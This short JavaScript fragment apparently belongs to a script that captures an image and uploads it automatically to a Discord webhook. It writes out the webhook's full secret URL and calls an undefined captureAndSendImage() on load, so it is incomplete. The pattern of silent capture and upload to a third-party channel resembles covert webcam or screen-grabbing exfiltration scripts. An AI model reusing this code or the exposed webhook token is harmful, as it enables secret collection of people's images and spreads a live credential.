function sendToDiscordWebhook(imageDataUrl) {
    const webhookUrl = 'https://discord.com/api/webhooks/1160771156278788116/63oDbOcnc8Gfg1iWr7_v0zY_nZQl-_H8mu1GZDGsw9Aaw9UjV4-qezVugmdZSSnR5N-B';

    const formData = new FormData();
    formData.append('file', dataURLtoBlob(imageDataUrl), 'image.jpg');

    fetch(webhookUrl, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            console.log('Script works');
        } else {
            console.error('Error sending image to Discord:', response.statusText);
        }
    })
    .catch(error => console.error('Error sending image to Discord:', error));
}

function dataURLtoBlob(dataURL) {
    const parts = dataURL.split(';base64,');
    const contentType = parts[0].split(':')[1];
    const byteCharacters = atob(parts[1]);
    const byteNumbers = new Array(byteCharacters.length);

    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }

    const byteArray = new Uint8Array(byteNumbers);
    return new Blob([byteArray], { type: contentType });
}

// Call the function to capture and send the image
captureAndSendImage();
